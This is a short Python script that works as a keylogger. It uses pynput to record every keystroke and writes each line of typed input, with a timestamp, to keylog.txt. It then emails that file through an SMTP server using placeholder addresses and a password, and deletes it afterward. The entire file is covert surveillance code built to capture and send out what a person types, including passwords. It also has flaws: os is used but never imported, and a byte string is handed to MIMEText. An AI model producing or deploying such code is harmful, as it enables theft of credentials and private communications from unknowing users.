import pynput
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def on_press(key):
    global keys
    keys.append(str(key))
    
def on_release(key):
    global keys
    if key == pynput.keyboard.Key.enter:
        log_keys()
        keys = []
        
def log_keys():
    global keys
    log_file = open("keylog.txt", "a")
    log_file.write(time.ctime() + " - " + ''.join(keys) + "\n")
    log_file.close()
    send_email()
    
def send_email():
    from_addr = "your_email@example.com"
    to_addr = "recipient_email@example.com"
    subject = "Keylogger Log"
    body = "Attached is the keylogger log."
    attachment = open("keylog.txt", "rb")
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    msg.attach(MIMEText(attachment.read(), 'plain', 'utf-8'))
    msg['Content-Type'] = 'multipart/mixed'
    server = smtplib.SMTP('smtp.example.com', 587)
    server.starttls()
    server.login(from_addr, "your_password")
    text = msg.as_string()
    server.sendmail(from_addr, to_addr, text)
    server.quit()
    attachment.close()
    os.remove("keylog.txt")
    
keys = []
listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
